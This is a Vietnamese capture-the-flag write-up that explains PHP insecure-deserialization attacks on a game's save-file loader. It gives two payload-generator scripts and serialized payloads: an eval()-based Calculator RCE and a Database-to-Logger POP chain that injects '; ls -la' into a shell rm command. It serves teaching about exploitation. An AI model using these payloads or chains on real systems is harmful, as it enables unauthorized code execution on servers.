# PHP Deserialization 3

# Thử thách về lỗi bảo mật liên quan đến quá trình Serialize và Deserialize

# Mục tiêu: RCE server và đọc bí mật ở thư mục gốc
Trong file utils.php của bạn, có ít nhất hai "gadget" (đoạn code có thể bị lạm dụng) cực kỳ nguy hiểm:

- `Calculator->run()`: Dẫn đến thực thi mã từ xa (RCE) thông qua `eval()`.
- `Logger->close()`: Dẫn đến xóa file tùy ý thông qua `system("rm ...")`.
## Kịch bản 1: Thực thi mã từ xa (RCE) với `Calculator` (Đơn giản và Trực tiếp)
Đây là kịch bản tấn công đơn giản và nguy hiểm nhất.

Phân tích:

Class `Trainer` có một phương thức tên là `run()`.

Class `Calculator` cũng có một phương thức tên là `run()`.
```
class Calculator {
    public $expression;
    public function __construct($expr) {
        $this->expression = $expr;
    }

    public function run() {
        $result = eval($this->expression);
        return $result;
    }
}
```

Khi người chơi chạy trốn trong game (ví dụ ở map1.php), server sẽ gọi `$_SESSION["trainer"]->run()`.

Tạo Payload: Kẻ tấn công tạo một file `pokemon.sav` chứa đối tượng `Calculator` đã được serialize, trong đó thuộc tính `$expression` chứa mã PHP độc hại.

Payload: ```O:10:"Calculator":1:{s:10:"expression";s:18:"system('ls -la');";}```

`O:10:"Calculator"`: Tạo đối tượng class `Calculator`.

`s:10:"expression";s:18:"system('ls -la');"`: Gán giá trị `system('ls -la')`; cho thuộc tính `expression`.
Tấn công:

Kẻ tấn công dùng chức năng "Load Game" để tải file pokemon.sav này lên.

Hàm unserialize() trong save-load.php sẽ tạo ra một đối tượng Calculator và lưu vào `$_SESSION["trainer"]`.

Bây giờ, kẻ tấn công di chuyển trên bản đồ và chọn hành động "Run" (chạy trốn).

Kích hoạt:
- Lệnh ls -la được thực thi trên server, và kẻ tấn công đã chiếm được quyền thực thi mã từ xa.
## Tạo Payload cho RCE
Để tạo payload cho RCE, kẻ tấn công cần viết một đoạn mã PHP để tạo ra đối tượng `Calculator` với thuộc tính `expression` chứa mã PHP độc hại
và sau đó serialize đối tượng này. Dưới đây là ví dụ về cách làm điều này:

```
<?php
// File: generate_calculator_payload.php (chạy trên máy của kẻ tấn công)

// Kẻ tấn công chỉ cần định nghĩa class với thuộc tính cần thiết để serialize.
class Calculator {
    public $expression;
}

// 1. Tạo một đối tượng Calculator.
$malicious_object = new Calculator();

// 2. Gán mã PHP độc hại vào thuộc tính 'expression'.
//    Hàm system() sẽ thực thi một lệnh của hệ điều hành.
//    Ở đây là lệnh 'ls -la' để liệt kê tất cả file trong thư mục hiện tại.
$malicious_object->expression = "system('ls -la');";

// 3. Serialize đối tượng để tạo ra chuỗi payload.
$payload = serialize($malicious_object);

// 4. In ra chuỗi payload. Kẻ tấn công sẽ sao chép chuỗi này
//    và lưu vào file tên là 'pokemon.sav'.
echo $payload;
// Kết quả ví dụ: O:10:"Calculator":1:{s:10:"expression";s:18:"system('ls -la');";}
?>
```
## Kịch bản 2: Xóa file tùy ý với `Logger` (Phức tạp hơn)
Class `Logger` có một phương thức tên là `close()`, sử dụng hàm `system()` để xóa file tùy ý.
```
class Logger {
    public $filepath;
    public function __construct($filepath) {
        $this->filepath = $filepath;    
    }

    public function log($data) {
        $file = fopen($this->filepath, "w");
        fwrite($file, $data);
        fclose($file);
    }

    public function close() {
        system("rm " . $this->filepath);
    }

}
```
Khai thác Logger để thực thi lệnh (Command Injection)

Câu hỏi của bạn về việc dùng `; ls -la` là hoàn toàn chính xác. Đây là một kỹ thuật kinh điển gọi là Command Injection.

Kẻ tấn công không cần xóa file. Họ có thể dùng dấu chấm phẩy (`;`) để kết thúc lệnh `rm` và bắt đầu một lệnh mới.

Code PHP kẻ tấn công sử dụng để tạo payload (POP Chain)
Kịch bản này phức tạp hơn vì `Logger->close()` không được gọi trực tiếp. Kẻ tấn công phải tạo một chuỗi tấn công (POP Chain) bằng cách lạm dụng magic method `__destruct` của class `Database`.
```
<?php
// File: generate_logger_payload.php (chạy trên máy của kẻ tấn công)

// Định nghĩa các class cần thiết cho chuỗi POP chain.
class Database {
    public $conn;
}

class Logger {
    public $filepath;
}

// --- Bắt đầu tạo payload ---

// 1. Tạo đối tượng cuối cùng trong chuỗi (Logger) với payload command injection.
$logger_object = new Logger();

// 2. Gán payload vào thuộc tính 'filepath'.
//    - 'dummy.txt' là tên file giả để lệnh 'rm' không báo lỗi.
//    - ';' là ký tự ngăn cách lệnh trong shell.
//    - 'ls -la' là lệnh mà kẻ tấn công thực sự muốn chạy.
$logger_object->filepath = "dummy.txt; ls -la";

// 3. Tạo đối tượng bắt đầu chuỗi (Database).
$database_object = new Database();

// 4. Liên kết chuỗi: Gán đối tượng Logger vào thuộc tính 'conn' của Database.
$database_object->conn = $logger_object;

// 5. Serialize đối tượng đầu chuỗi (Database) để tạo payload cuối cùng.
$payload = serialize($database_object);

// 6. In ra payload.
echo $payload;
// Kết quả ví dụ: O:8:"Database":1:{s:4:"conn";O:6:"Logger":1:{s:8:"filepath";s:17:"dummy.txt; ls -la";}}
?>
```
Cách khai thác

Kẻ tấn công tạo và tải file `pokemon.sav` chứa payload của `Database` lên.

Server `unserialize()` chuỗi này, tạo ra một đối tượng `Database` mà thuộc tính `conn` của nó lại là một đối tượng `Logger` chứa payload độc hại.

Script `save-load.php` chạy xong.

PHP tự động gọi magic method `__destruct()` trên đối tượng `Database`.

Hàm `__destruct()` thực thi `$this->conn->close()`.

Vì `$this->conn` chính là đối tượng `Logger`, lệnh này thực chất là gọi `Logger->close()`.

Hàm `Logger->close()` được gọi, và nó thực thi lệnh `system("rm " . $this->filepath)`.

Lệnh cuối cùng được thực thi trên shell của server là: `system("rm dummy.txt; ls -la")`. Shell sẽ chạy lệnh `rm dummy.txt `trước, sau đó chạy lệnh `ls -la`.

Cả hai kịch bản này đều cực kỳ nguy hiểm và đều bắt nguồn từ một điểm yếu duy nhất: việc tin tưởng và `unserialize()` dữ liệu từ người dùng. Hy vọng các ví dụ trên đã giúp bạn hiểu rõ hơn về cách chúng bị khai thác.